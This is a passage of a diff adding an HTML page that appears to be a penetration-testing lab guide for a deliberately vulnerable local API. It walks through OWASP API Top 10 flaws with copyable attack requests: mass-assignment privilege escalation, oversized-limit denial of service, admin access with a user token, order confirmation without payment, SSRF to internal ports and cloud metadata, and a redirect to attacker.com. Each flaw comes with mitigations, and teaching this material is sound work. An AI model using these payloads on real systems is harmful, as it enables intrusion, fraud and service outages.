+                        <td style="color: #ff6666;">FULL SYSTEM</td>
+                    </tr>
+                </table>
+
+                <h3>[ IMPACT ]</h3>
+                <div class="impact-section">
+                    <div class="impact-title">💥 COMPLETE PRIVILEGE ESCALATION:</div>
+                    <div class="impact-text">
+                        ✗ Regular user becomes system administrator<br>
+                        ✗ Access to ALL admin functionalities<br>
+                        ✗ Can modify/delete any database entries<br>
+                        ✗ Complete system compromise in seconds
+                    </div>
+                </div>
+
+                <h3>[ POSTMAN TEST ]</h3>
+                <div class="payload-box">
+                    Method: PATCH<br>
+                    URL: /api/users/1<br>
+                    Body: {"is_admin": true, "role": "admin"}<br>
+                    Expected: 200 OK - YOU'RE NOW ADMIN!
+                </div>
+                <button class="toggle-button" onclick="toggleDetails('details-api3')">Show Concept & Mitigation</button>
+                <div class="details-panel" id="details-api3" data-records="1" data-revenue="0">
+                    <h4>Concept</h4>
+                    <p>Mass assignment occurs when APIs accept arbitrary fields in update payloads and directly map them to model attributes without filtering. Attackers can set privileged fields like <code>is_admin</code>.</p>
+
+                    <h4>Estimated Impact</h4>
+                    <ul>
+                        <li class="metric">Scope: Local account privilege escalation to admin</li>
+                        <li class="metric">Potential: Full system control once admin</li>
+                        <li class="metric">Realistic consequence: data deletion, user takeover</li>
+                    </ul>
+
+                    <h4>Mitigations</h4>
+                    <ol>
+                        <li>Whitelist allowed fields for updates</li>
+                        <li>Perform server-side role checks</li>
+                        <li>Use separate DTOs for public API inputs</li>
+                    </ol>
+
+                    <h4>Postman Step-by-step</h4>
+                    <div class="code-block" id="payload-api3">PATCH /api/users/1
+Headers: Authorization: Bearer &lt;USER_TOKEN&gt;
+Body: {"is_admin": true, "role": "admin"}</div>
+                    <button class="toggle-button" onclick="copyPayload('payload-api3')">Copy Payload</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- API 4: RESOURCE EXHAUSTION -->
+        <div id="api4" class="tab-content">
+            <h2>🔴 API-4: UNRESTRICTED RESOURCE CONSUMPTION (DoS)</h2>
+            
+            <div class="vuln-card">
+                <div class="vuln-header">
+                    <span class="vuln-id">#4</span>
+                    <span class="vuln-title">Server Crash via Resource Exhaustion</span>
+                    <div>
+                        <div class="severity-badge">HIGH: 7.5</div>
+                        <div class="cvss-score">CVSS v3.1: Denial of Service</div>
+                    </div>
+                </div>
+
+                <h3>[ VULNERABILITY DESCRIPTION ]</h3>
+                <p>No rate limiting or input validation on pagination limits. Attackers can cause server memory exhaustion.</p>
+
+                <h3>[ EXPLOITATION TEST ]</h3>
+                <div class="attack-step">
+                    <span class="step-number">STEP 1:</span>
+                    <span class="step-content">Request huge page limit to exhaust memory</span>
+                </div>
+                <div class="code-block">
+                    <code>GET /api/products?limit=999999999
+GET /api/users?limit=999999999
+GET /api/orders?limit=999999999</code>
+                </div>
+
+                <h3>[ ATTACK VARIATIONS ]</h3>
+                <table>
+                    <tr>
+                        <th>PAYLOAD</th>
+                        <th>EFFECT</th>
+                        <th>IMPACT</th>
+                    </tr>
+                    <tr>
+                        <td>?limit=999999999</td>
+                        <td>Memory exhaustion</td>
+                        <td>Server crash</td>
+                    </tr>
+                    <tr>
+                        <td>?offset=999999999</td>
+                        <td>CPU spike</td>
+                        <td>Slow response</td>
+                    </tr>
+                    <tr>
+                        <td>Rapid requests</td>
+                        <td>Connection pool depleted</td>
+                        <td>Denial of Service</td>
+                    </tr>
+                </table>
+
+                <h3>[ IMPACT ]</h3>
+                <div class="impact-section">
+                    <div class="impact-title">💥 DENIAL OF SERVICE ATTACK:</div>
+                    <div class="impact-text">
+                        ✗ API becomes unavailable to legitimate users<br>
+                        ✗ Server resources exhausted (CPU, Memory)<br>
+                        ✗ Service interruption for all customers<br>
+                        ✗ Economic losses from downtime
+                    </div>
+                </div>
+
+                <h3>[ POSTMAN TEST ]</h3>
+                <div class="payload-box">
+                    Method: GET<br>
+                    URL: /api/products?limit=999999999<br>
+                    Expected: Server crash or extreme slowdown
+                </div>
+                <button class="toggle-button" onclick="toggleDetails('details-api4')">Show Concept & Mitigation</button>
+                <div class="details-panel" id="details-api4" data-records="0" data-revenue="0">
+                    <h4>Concept</h4>
+                    <p>Unrestricted resource consumption happens when the API accepts unbounded input (large limits, no rate-limiting) causing excessive memory/CPU usage.</p>
+
+                    <h4>Estimated Impact</h4>
+                    <ul>
+                        <li class="metric">Immediate effect: Slow responses or server OOM</li>
+                        <li class="metric">Availability: Service outage for hours</li>
+                        <li class="metric">Cost: Increased hosting expenses or downtime losses</li>
+                    </ul>
+
+                    <h4>Mitigations</h4>
+                    <ol>
+                        <li>Enforce sensible server-side limits (max page size)</li>
+                        <li>Implement rate limiting and request throttling</li>
+                        <li>Use pagination cursors and resource quotas</li>
+                    </ol>
+
+                    <h4>Postman Step-by-step</h4>
+                    <div class="code-block" id="payload-api4">GET /api/products?limit=999999999</div>
+                    <button class="toggle-button" onclick="copyPayload('payload-api4')">Copy Payload</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- API 5: BROKEN FUNCTION-LEVEL AUTHORIZATION -->
+        <div id="api5" class="tab-content">
+            <h2>🔴 API-5: BROKEN FUNCTION-LEVEL AUTHORIZATION</h2>
+            
+            <div class="vuln-card">
+                <div class="vuln-header">
+                    <span class="vuln-id">#5</span>
+                    <span class="vuln-title">Access Admin Functions as Regular User</span>
+                    <div>
+                        <div class="severity-badge">CRITICAL: 9.1</div>
+                        <div class="cvss-score">CVSS v3.1: Authorization Bypass</div>
+                    </div>
+                </div>
+
+                <h3>[ VULNERABILITY DESCRIPTION ]</h3>
+                <p>Admin endpoints have no function-level authorization checks. Any authenticated user can access admin operations.</p>
+
+                <h3>[ EXPLOITATION STEPS ]</h3>
+                <div class="attack-step">
+                    <span class="step-number">STEP 1:</span>
+                    <span class="step-content">Login as regular USER (not admin)</span>
+                </div>
+                <div class="code-block">
+                    <code>POST /api/auth/login
+{
+  "email": "user2@example.com",
+  "password": "Password123"
+}</code>
+                </div>
+
+                <div class="attack-step">
+                    <span class="step-number">STEP 2:</span>
+                    <span class="step-content">Access admin endpoint directly</span>
+                </div>
+                <div class="code-block">
+                    <code>GET /api/admin/users
+Headers: Authorization: Bearer REGULAR_USER_TOKEN
+(Notice: No permission check!)</code>
+                </div>
+
+                <h3>[ ADMIN FUNCTIONS EXPOSED ]</h3>
+                <table>
+                    <tr>
+                        <th>ENDPOINT</th>
+                        <th>FUNCTION</th>
+                        <th>ACCESS</th>
+                    </tr>
+                    <tr>
+                        <td>/api/admin/users</td>
+                        <td>View all users</td>
+                        <td style="color: #ff6666;">✗ VULNERABLE</td>
+                    </tr>
+                    <tr>
+                        <td>/api/admin/delete</td>
+                        <td>Delete entries</td>
+                        <td style="color: #ff6666;">✗ VULNERABLE</td>
+                    </tr>
+                    <tr>
+                        <td>/api/admin/reports</td>
+                        <td>System reports</td>
+                        <td style="color: #ff6666;">✗ VULNERABLE</td>
+                    </tr>
+                </table>
+
+                <h3>[ IMPACT ]</h3>
+                <div class="impact-section">
+                    <div class="impact-title">💥 ADMINISTRATIVE ACCESS WITHOUT AUTHORIZATION:</div>
+                    <div class="impact-text">
+                        ✗ Regular users can access admin operations<br>
+                        ✗ System-wide data viewing possible<br>
+                        ✗ Ability to delete critical data<br>
+                        ✗ Complete function-level bypass
+                    </div>
+                </div>
+
+                <h3>[ POSTMAN TEST ]</h3>
+                <div class="payload-box">
+                    Method: GET<br>
+                    URL: /api/admin/users<br>
+                    Auth: Use Regular User Token<br>
+                    Expected: 200 OK - ALL USERS EXPOSED!
+                </div>
+                <button class="toggle-button" onclick="toggleDetails('details-api5')">Show Concept & Mitigation</button>
+                <div class="details-panel" id="details-api5" data-records="100" data-revenue="0">
+                    <h4>Concept</h4>
+                    <p>Broken function-level authorization occurs when the API fails to enforce role checks for specific operations (e.g., admin-only functions).</p>
+
+                    <h4>Estimated Impact</h4>
+                    <ul>
+                        <li class="metric">Data exposure: All users, ability to delete entries</li>
+                        <li class="metric">Operational impact: Data integrity loss, unauthorized deletes</li>
+                    </ul>
+
+                    <h4>Mitigations</h4>
+                    <ol>
+                        <li>Enforce RBAC/ABAC checks on function entry points</li>
+                        <li>Use middleware to centralize authorization logic</li>
+                        <li>Log and alert on unauthorized attempts</li>
+                    </ol>
+
+                    <h4>Postman Step-by-step</h4>
+                    <div class="code-block" id="payload-api5">GET /api/admin/users
+Headers: Authorization: Bearer &lt;REGULAR_USER_TOKEN&gt;</div>
+                    <button class="toggle-button" onclick="copyPayload('payload-api5')">Copy Payload</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- API 6: BUSINESS LOGIC -->
+        <div id="api6" class="tab-content">
+            <h2>🔴 API-6: UNRESTRICTED SENSITIVE BUSINESS FLOWS</h2>
+            
+            <div class="vuln-card">
+                <div class="vuln-header">
+                    <span class="vuln-id">#6</span>
+                    <span class="vuln-title">Purchase Without Paying - Business Logic Bypass</span>
+                    <div>
+                        <div class="severity-badge">CRITICAL: 8.9</div>
+                        <div class="cvss-score">CVSS v3.1: Business Logic Flaw</div>
+                    </div>
+                </div>
+
+                <h3>[ VULNERABILITY DESCRIPTION ]</h3>
+                <p>Order confirmation skips payment verification. Users can confirm orders without paying by bypassing payment flow.</p>
+
+                <h3>[ NORMAL FLOW (SECURE) ]</h3>
+                <div class="attack-step">
+                    <span class="step-number">1.</span>
+                    <span class="step-content">Create order</span>
+                </div>
+                <div class="attack-step">
+                    <span class="step-number">2.</span>
+                    <span class="step-content">Process payment</span>
+                </div>
+                <div class="attack-step">
+                    <span class="step-number">3.</span>
+                    <span class="step-content">Confirm order</span>
+                </div>
+
+                <h3>[ EXPLOITED FLOW (VULNERABLE) ]</h3>
+                <div class="attack-step">
+                    <span class="step-number">1.</span>
+                    <span class="step-content">Create order</span>
+                </div>
+                <div class="attack-step">
+                    <span class="step-number">2.</span>
+                    <span class="step-content">SKIP payment (just call confirm directly)</span>
+                </div>
+                <div class="attack-step">
+                    <span class="step-number">3.</span>
+                    <span class="step-content">Confirm order WITHOUT payment</span>
+                </div>
+
+                <h3>[ EXPLOITATION STEPS ]</h3>
+                <div class="attack-step">
+                    <span class="step-number">STEP 1:</span>
+                    <span class="step-content">Create an order</span>
+                </div>
+                <div class="code-block">
+                    <code>POST /api/orders/create
+{
+  "product_id": 3,
+  "quantity": 5
+}
+Response: {"order_id": 99, "status": "CREATED"}</code>
+                </div>
+
+                <div class="attack-step">
+                    <span class="step-number">STEP 2:</span>
+                    <span class="step-content">Confirm order WITHOUT payment step</span>
+                </div>
+                <div class="code-block">
+                    <code>POST /api/orders/99/confirm
+(No payment verification!)</code>
+                </div>
+
+                <div class="attack-step">
+                    <span class="step-number">STEP 3:</span>
+                    <span class="step-content">Order confirmed - product shipped without payment!</span>
+                </div>
+
+                <h3>[ FINANCIAL IMPACT ]</h3>
+                <table>
+                    <tr>
+                        <th>SCENARIO</th>
+                        <th>NORMAL (SECURE)</th>
+                        <th>VULNERABLE</th>
+                    </tr>
+                    <tr>
+                        <td>iPhone Purchase</td>
+                        <td>Pay $80,000</td>
+                        <td>Pay $0 ✗</td>
+                    </tr>
+                    <tr>
+                        <td>Headphones x5</td>
+                        <td>Pay $25,000</td>
+                        <td>Pay $0 ✗</td>
+                    </tr>
+                    <tr>
+                        <td>Total Loss</td>
+                        <td>$0 loss</td>
+                        <td>$105,000+ MONTHLY</td>
+                    </tr>
+                </table>
+
+                <h3>[ IMPACT ]</h3>
+                <div class="impact-section">
+                    <div class="impact-title">💥 FINANCIAL FRAUD:</div>
+                    <div class="impact-text">
+                        ✗ Products shipped without payment<br>
+                        ✗ Revenue loss for every transaction<br>
+                        ✗ Inventory depletion<br>
+                        ✗ Massive financial damages
+                    </div>
+                </div>
+
+                <h3>[ POSTMAN TEST ]</h3>
+                <div class="payload-box">
+                    Step 1 - Method: POST<br>
+                    URL: /api/orders/create<br>
+                    Body: {"product_id": 3, "quantity": 5}<br>
+                    <br>
+                    Step 2 - Method: POST<br>
+                    URL: /api/orders/{order_id}/confirm<br>
+                    Result: Order confirmed WITHOUT payment!
+                </div>
+                <button class="toggle-button" onclick="toggleDetails('details-api6')">Show Concept & Mitigation</button>
+                <div class="details-panel" id="details-api6" data-records="10" data-revenue="100000">
+                    <h4>Concept</h4>
+                    <p>Business logic flaws allow attackers to abuse valid flows to achieve unauthorized results (e.g., confirm order without payment).</p>
+
+                    <h4>Estimated Impact</h4>
+                    <ul>
+                        <li class="metric">Immediate revenue loss: sample cases show $100k+ exposure</li>
+                        <li class="metric">Inventory loss: items shipped without payment</li>
+                    </ul>
+
+                    <h4>Mitigations</h4>
+                    <ol>
+                        <li>Validate business preconditions server-side (payment status)</li>
+                        <li>Use strong transactional workflows that require payment confirmation</li>
+                        <li>Introduce reconciliation and monitoring to detect anomalies</li>
+                    </ol>
+
+                    <h4>Postman Step-by-step</h4>
+                    <div class="code-block" id="payload-api6">POST /api/orders/create
+Body: {"product_id":3,"quantity":5}
+POST /api/orders/{id}/confirm</div>
+                    <button class="toggle-button" onclick="copyPayload('payload-api6')">Copy Payload</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- API 7: SSRF -->
+        <div id="api7" class="tab-content">
+            <h2>🔴 API-7: SERVER SIDE REQUEST FORGERY (SSRF)</h2>
+            
+            <div class="vuln-card">
+                <div class="vuln-header">
+                    <span class="vuln-id">#7</span>
+                    <span class="vuln-title">Internal Network Access via SSRF Attack</span>
+                    <div>
+                        <div class="severity-badge">HIGH: 8.6</div>
+                        <div class="cvss-score">CVSS v3.1: Network Access</div>
+                    </div>
+                </div>
+
+                <h3>[ VULNERABILITY DESCRIPTION ]</h3>
+                <p>API accepts untrusted URLs without validation. Attackers can make server access internal resources.</p>
+
+                <h3>[ EXPLOITATION STEPS ]</h3>
+                <div class="attack-step">
+                    <span class="step-number">STEP 1:</span>
+                    <span class="step-content">Find SSRF endpoint</span>
+                </div>
+                <div class="code-block">
+                    <code>POST /api/utils/fetch-url
+{
+  "url": "http://localhost:8000/admin"
+}</code>
+                </div>
+
+                <div class="attack-step">
+                    <span class="step-number">STEP 2:</span>
+                    <span class="step-content">Access internal services</span>
+                </div>
+                <div class="code-block">
+                    <code>http://localhost:6379 (Redis)
+http://127.0.0.1:5432 (Database)
+http://169.254.169.254/ (AWS Metadata)
+http://internal-api.local/admin</code>
+                </div>
+
+                <h3>[ IMPACT ]</h3>
+                <div class="impact-section">
+                    <div class="impact-title">💥 INTERNAL SYSTEM COMPROMISE:</div>
+                    <div class="impact-text">
+                        ✗ Access to internal services<br>
+                        ✗ Data exfiltration from databases<br>
+                        ✗ Cloud metadata access<br>
+                        ✗ Lateral movement in network
+                    </div>
+                </div>
+
+                <h3>[ POSTMAN TEST ]</h3>
+                <div class="payload-box">
+                    Method: POST<br>
+                    URL: /api/utils/fetch-url<br>
+                    Body: {"url": "http://localhost:6379"}<br>
+                    Expected: Internal service response
+                </div>
+                <button class="toggle-button" onclick="toggleDetails('details-api7')">Show Concept & Mitigation</button>
+                <div class="details-panel" id="details-api7" data-records="5" data-revenue="0">
+                    <h4>Concept</h4>
+                    <p>SSRF allows an attacker to make the server send requests to internal resources (databases, metadata services), potentially revealing secrets.</p>
+
+                    <h4>Estimated Impact</h4>
+                    <ul>
+                        <li class="metric">Targeted systems: Redis, DB ports, cloud metadata</li>
+                        <li class="metric">Potential secrets exposed: DB credentials, tokens</li>
+                    </ul>
+
+                    <h4>Mitigations</h4>
+                    <ol>
+                        <li>Validate and whitelist allowed domains/URLs</li>
+                        <li>Use network egress controls (deny-by-default)</li>
+                        <li>Sanitize and parse URL inputs safely</li>
+                    </ol>
+
+                    <h4>Postman Step-by-step</h4>
+                    <div class="code-block" id="payload-api7">POST /api/utils/fetch-url
+Body: {"url":"http://127.0.0.1:5432"}</div>
+                    <button class="toggle-button" onclick="copyPayload('payload-api7')">Copy Payload</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- API 8: SECURITY MISCONFIGURATION -->
+        <div id="api8" class="tab-content">
+            <h2>🔴 API-8: SECURITY MISCONFIGURATION</h2>
+            
+            <div class="vuln-card">
+                <div class="vuln-header">
+                    <span class="vuln-id">#8</span>
+                    <span class="vuln-title">Debug Data Exposure & Insecure Headers</span>
+                    <div>
+                        <div class="severity-badge">HIGH: 7.3</div>
+                        <div class="cvss-score">CVSS v3.1: Information Disclosure</div>
+                    </div>
+                </div>
+
+                <h3>[ VULNERABILITY DESCRIPTION ]</h3>
+                <p>Security headers missing. Debug mode enabled. Stack traces exposed in errors.</p>
+
+                <h3>[ TEST 1: MISSING SECURITY HEADERS ]</h3>
+                <div class="attack-step">
+                    <span class="step-number">STEP 1:</span>
+                    <span class="step-content">Check response headers</span>
+                </div>
+                <div class="code-block">
+                    <code>curl -i http://localhost:5000/api/health
+
+Missing headers:
+✗ X-Frame-Options
+✗ X-Content-Type-Options
+✗ Content-Security-Policy
+✗ X-XSS-Protection</code>
+                </div>
+
+                <h3>[ TEST 2: DEBUG ENDPOINTS ENABLED ]</h3>
+                <div class="code-block">
+                    <code>GET /api/v1/debug/users (NO auth required!)
+GET /api/v1/debug/config
+GET /api/v1/debug/database</code>
+                </div>
+
+                <button class="toggle-button" onclick="toggleDetails('details-api8')">Show Concept & Mitigation</button>
+                <div class="details-panel" id="details-api8" data-records="1000" data-revenue="0">
+                    <h4>Concept</h4>
+                    <p>Security misconfiguration includes debug endpoints left enabled, verbose error messages, and missing security headers which aid attackers.</p>
+
+                    <h4>Estimated Impact</h4>
+                    <ul>
+                        <li class="metric">Sensitive endpoints exposed: debug/config/logs</li>
+                        <li class="metric">Credentials/stack traces: immediate leakage</li>
+                    </ul>
+
+                    <h4>Mitigations</h4>
+                    <ol>
+                        <li>Disable debug endpoints in production</li>
+                        <li>Enable security headers (CSP, X-Frame-Options, etc.)</li>
+                        <li>Sanitize error outputs and control stack trace verbosity</li>
+                    </ol>
+
+                    <h4>Postman Step-by-step</h4>
+                    <div class="code-block" id="payload-api8">curl -i http://localhost:5000/api/health</div>
+                    <button class="toggle-button" onclick="copyPayload('payload-api8')">Copy Payload</button>
+                </div>
+
+                <h3>[ IMPACT ]</h3>
+                <div class="impact-section">
+                    <div class="impact-title">💥 INFORMATION DISCLOSURE:</div>
+                    <div class="impact-text">
+                        ✗ Debug endpoints expose sensitivedata<br>
+                        ✗ Missing security headers enable attacks<br>
+                        ✗ XSS attacks not prevented<br>
+                        ✗ Clickjacking possible
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- API 9: IMPROPER INVENTORY MANAGEMENT -->
+        <div id="api9" class="tab-content">
+            <h2>🔴 API-9: IMPROPER INVENTORY MANAGEMENT</h2>
+            
+            <div class="vuln-card">
+                <div class="vuln-header">
+                    <span class="vuln-id">#9</span>
+                    <span class="vuln-title">Exposed Sensitive Endpoints & Deprecated APIs</span>
+                    <div>
+                        <div class="severity-badge">HIGH: 7.5</div>
+                        <div class="cvss-score">CVSS v3.1: Exposure</div>
+                    </div>
+                </div>
+
+                <h3>[ VULNERABILITY DESCRIPTION ]</h3>
+                <p>Unpatched/forgotten endpoints still accessible. Deprecated APIs not decommissioned.</p>
+
+                <h3>[ EXPOSED ENDPOINTS ]</h3>
+                <table>
+                    <tr>
+                        <th>ENDPOINT</th>
+                        <th>STATUS</th>
+                        <th>DATA EXPOSED</th>
+                    </tr>
+                    <tr>
+                        <td>/api/v1/debug/users</td>
+                        <td style="color: #ff6666;">ACTIVE</td>
+                        <td>All user profiles + passwords!</td>
+                    </tr>
+                    <tr>
+                        <td>/api/internal/config</td>
+                        <td style="color: #ff6666;">ACTIVE</td>
+                        <td>Database credentials</td>
+                    </tr>
+                    <tr>
+                        <td>/api/backup/export</td>
+                        <td style="color: #ff6666;">ACTIVE</td>
+                        <td>Complete database dump</td>
+                    </tr>
+                </table>
+
+                <h3>[ EXPLOITATION ]</h3>
+                <div class="code-block">
+                    <code>GET /api/v1/debug/users (Returns all users with passwords!)
+GET /api/v1/debug/config (Database connection strings)
+GET /api/v1/debug/logs (System logs)</code>
+                </div>
+
+                <h3>[ IMPACT ]</h3>
+                <div class="impact-section">
+                    <div class="impact-title">💥 UNNECESSARY EXPOSURE:</div>
+                    <div class="impact-text">
+                        ✗ Forgotten endpoints accessible<br>
+                        ✗ Credentials exposed via debug endpoints<br>
+                        ✗ Complete system compromise possible<br>
+                        ✗ Inventory mismanagement
+                    </div>
+                </div>
+                <button class="toggle-button" onclick="toggleDetails('details-api9')">Show Concept & Mitigation</button>
+                <div class="details-panel" id="details-api9" data-records="10000" data-revenue="0">
+                    <h4>Concept</h4>
+                    <p>Improper inventory management refers to leftover or deprecated endpoints and services that remain accessible and leak sensitive data.</p>
+
+                    <h4>Estimated Impact</h4>
+                    <ul>
+                        <li class="metric">Data exposure: full DB dumps or backup exports possible</li>
+                        <li class="metric">Operational risk: unauthorized exports of entire datasets</li>
+                    </ul>
+
+                    <h4>Mitigations</h4>
+                    <ol>
+                        <li>Inventory all endpoints and decommission unused ones</li>
+                        <li>Remove debug and backup endpoints from public interfaces</li>
+                        <li>Enforce access controls and network ACLs for internal endpoints</li>
+                    </ol>
+
+                    <h4>Postman Step-by-step</h4>
+                    <div class="code-block" id="payload-api9">GET /api/v1/debug/users</div>
+                    <button class="toggle-button" onclick="copyPayload('payload-api9')">Copy Payload</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- API 10: UNSAFE CONSUMPTION -->
+        <div id="api10" class="tab-content">
+            <h2>🔴 API-10: UNSAFE CONSUMPTION OF APIS</h2>
+            
+            <div class="vuln-card">
+                <div class="vuln-header">
+                    <span class="vuln-id">#10</span>
+                    <span class="vuln-title">Third-Party API Integration Vulnerabilities</span>
+                    <div>
+                        <div class="severity-badge">MEDIUM: 6.8</div>
+                        <div class="cvss-score">CVSS v3.1: External Dependency Risk</div>
+                    </div>
+                </div>
+
+                <h3>[ VULNERABILITY DESCRIPTION ]</h3>
+                <p>API integrates external shipping/payment APIs without proper validation or security checks.</p>
+
+                <h3>[ TEST 1: UNSAFE SHIPPING QUOTE ]</h3>
+                <div class="attack-step">
+                    <span class="step-number">STEP 1:</span>
+                    <span class="step-content">Request shipping quote from untrusted source</span>
+                </div>
+                <div class="code-block">
+                    <code>GET /api/shipping/quote?destination=http://attacker.com</code>
+                </div>
+
+                <h3>[ TEST 2: PAYMENT PROCESSOR BYPASS ]</h3>
+                <div class="code-block">
+                    <code>POST /api/payment/process
+{
+  "amount": 0,
+  "currency": "USD",
+  "provider": "malicious-payment.com"
+}</code>
+                </div>
+
+                <h3>[ ATTACK CHAIN ]</h3>
+                <table>
+                    <tr>
+                        <th>STEP</th>
+                        <th>ACTION</th>
+                        <th>RESULT</th>
+                    </tr>
+                    <tr>
+                        <td>1</td>
+                        <td>Intercept API request</td>
+                        <td>See external API calls</td>
+                    </tr>
+                    <tr>
+                        <td>2</td>
+                        <td>Modify API endpoint</td>
+                        <td>Redirect to attacker server</td>
+                    </tr>
+                    <tr>
+                        <td>3</td>
+                        <td>Capture responses</td>
+                        <td>Get payment tokens</td>
+                    </tr>
+                </table>
+
+                <h3>[ IMPACT ]</h3>
+                <div class="impact-section">
+                    <div class="impact-title">💥 THIRD-PARTY COMPROMISE:</div>
+                    <div class="impact-text">
+                        ✗ Payment information intercepted<br>
+                        ✗ Redirect to malicious APIs<br>
+                        ✗ Man-in-the-middle attacks<br>
+                        ✗ Chain reaction compromises
+                    </div>
+                </div>
+                <button class="toggle-button" onclick="toggleDetails('details-api10')">Show Concept & Mitigation</button>
+                <div class="details-panel" id="details-api10" data-records="0" data-revenue="50000">
+                    <h4>Concept</h4>
+                    <p>Unsafe consumption of third-party APIs can lead to supply-chain attacks, untrusted redirects, and token leakage when responses are not validated.</p>
+
+                    <h4>Estimated Impact</h4>
+                    <ul>
+                        <li class="metric">Compromise vectors: payment tokens, shipping data</li>
+                        <li class="metric">Business risk: fraudulent refunds, data exfiltration</li>
+                    </ul>
+
+                    <h4>Mitigations</h4>
+                    <ol>
+                        <li>Validate responses from third-party providers</li>
+                        <li>Use allowlists and signed requests to trusted providers</li>
+                        <li>Monitor third-party behavior and enable circuit breakers</li>
+                    </ol>
+
+                    <h4>Postman Step-by-step</h4>
+                    <div class="code-block" id="payload-api10">GET /api/shipping/quote?destination=http://attacker.com</div>
+                    <button class="toggle-button" onclick="copyPayload('payload-api10')">Copy Payload</button>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <p>>>> END OF EXPLOITATION GUIDE <<<</p>
+            <p>⚖️ For Authorized Penetration Testing Only | Real Data | Real Vulnerabilities | Professional Lab</p>
+        </footer>
+    </div>
+
+    <script>
+        const API_BASE_URL = 'http://localhost:5000';
+
+        async function loadData() {
+            try {
+                const users = await fetch(`${API_BASE_URL}/api/users`).then(r => r.json());
+                const products = await fetch(`${API_BASE_URL}/api/products`).then(r => r.json());
+                const orders = await fetch(`${API_BASE_URL}/api/orders`).then(r => r.json());
+
+                document.getElementById('apiStatus').innerHTML = '● ONLINE ✓';
+                document.getElementById('apiStatus').style.color = '#00ff00';
+                document.getElementById('userCount').textContent = users.users.length;
+                document.getElementById('tableUsers').textContent = users.users.length;
+                document.getElementById('tableProducts').textContent = products.products.length;
+                document.getElementById('tableOrders').textContent = orders.orders.length;
+                document.getElementById('dataCount').textContent = (users.users.length + products.products.length + orders.orders.length) + ' RECORDS';
+
+                // Users table
+                let usersHTML = users.users.map(u => `
+                    <tr>
+                        <td>${u.id}</td>
+                        <td>${u.email}</td>
+                        <td style="color: #ff6666;">${u.password}</td>
+                        <td>${u.role}</td>
+                        <td>$${u.balance}</td>
+                    </tr>
+                `).join('');
+                document.getElementById('usersTable').innerHTML = usersHTML;
+
+                // Products table
+                let productsHTML = products.products.map(p => `
+                    <tr>
+                        <td>${p.id}</td>
+                        <td>${p.name}</td>
+                        <td>$${(p.price/100).toFixed(2)}</td>
+                        <td>${p.stock}</td>
+                    </tr>
+                `).join('');
+                document.getElementById('productsTable').innerHTML = productsHTML;
+
+                // Orders table
+                let ordersHTML = orders.orders.map(o => `
+                    <tr>
+                        <td>${o.id}</td>
+                        <td>${o.user_id}</td>
+                        <td>Product ${o.product_id}</td>
+                        <td>${o.quantity}</td>
+                        <td>$${(o.client_price/100).toFixed(2)}</td>
+                        <td>${o.status}</td>
+                    </tr>
+                `).join('');
+                document.getElementById('ordersTable').innerHTML = ordersHTML;
+            } catch (e) {
+                document.getElementById('apiStatus').innerHTML = '● OFFLINE ✗';
+                document.getElementById('apiStatus').style.color = '#ff0000';
+            }
+        }
+
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-button').forEach(b => b.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+            event.target.classList.add('active');
+        }
+
+        // Toggle details panels (concept / impact / mitigation)
+        function toggleDetails(id) {
+            const el = document.getElementById(id);
+            if (!el) return;
+            if (el.style.display === 'block') el.style.display = 'none';
+            else el.style.display = 'block';
+            // scroll into view for UX
+            if (el.style.display === 'block') el.scrollIntoView({behavior: 'smooth', block: 'center'});
+        }
+
+        // Copy payload / snippet to clipboard
+        function copyPayload(id) {
+            const el = document.getElementById(id);
+            if (!el) return;
+            const text = el.innerText || el.textContent;
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(text).then(() => {
+                    el.style.border = '1px solid rgba(0,255,0,0.4)';
+                }).catch(() => {});
+            } else {
+                // fallback
+                const ta = document.createElement('textarea');
+                ta.value = text; document.body.appendChild(ta); ta.select();
+                try { document.execCommand('copy'); el.style.border = '1px solid rgba(0,255,0,0.4)'; } catch(e){}
+                ta.remove();
+            }
+        }
+
+        // Instructor panel controls
+        function toggleInstructorPanel() {
+            const p = document.getElementById('instructorPanel');
+            if (!p) return;
+            p.style.display = (p.style.display === 'block') ? 'none' : 'block';
+        }
+
+        function applySimulation() {
+            const ds = Number(document.getElementById('datasetMultiplier').value) || 1;
+            const fm = Number(document.getElementById('financialMultiplier').value) || 1;
+            document.querySelectorAll('.details-panel').forEach(panel => {
+                const baseRecords = Number(panel.getAttribute('data-records')) || 0;
+                const baseRevenue = Number(panel.getAttribute('data-revenue')) || 0;
+                const simRecords = Math.round(baseRecords * ds);
+                const simRevenue = Math.round(baseRevenue * fm);
+
+                // create or update simulation node
+                let sim = panel.querySelector('.simulation-metrics');
+                if (!sim) {
+                    sim = document.createElement('div');
+                    sim.className = 'simulation-metrics';
+                    sim.style.marginTop = '10px';
+                    sim.style.paddingTop = '8px';
+                    sim.style.borderTop = '1px dashed rgba(0,255,0,0.08)';
+                    panel.appendChild(sim);
+                }
+                sim.innerHTML = `<strong style="color:#00ff00;">Simulated Impact</strong><br>
+                    Records exposed (sim): <span style="color:#c0ff00; font-weight:700;">${simRecords}</span><br>
+                    Estimated revenue exposure (sim): <span style="color:#c0ff00; font-weight:700;">$${(simRevenue).toLocaleString()}</span>`;
+            });
+        }
+
+        function resetSimulation() {
+            document.getElementById('datasetMultiplier').value = 1;
+            document.getElementById('financialMultiplier').value = 1;
+            document.querySelectorAll('.details-panel .simulation-metrics').forEach(n => n.remove());
+        }
+
+        // Audit logs functions
+        let allLogs = [];
+
+        async function loadLogs() {
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/logs`, {
+                    method: 'GET',
+                    headers: {
+                        'Authorization': `Bearer ${localStorage.getItem('adminToken') || ''}`
+                    }
+                });
+                
+                if (!response.ok) {
+                    if (response.status === 403) {
+                        document.getElementById('logsTable').innerHTML = '<tr><td colspan="7" style="color:#ff0000; text-align:center;">❌ Unauthorized - Admin access required</td></tr>';
+                    } else if (response.status === 401) {
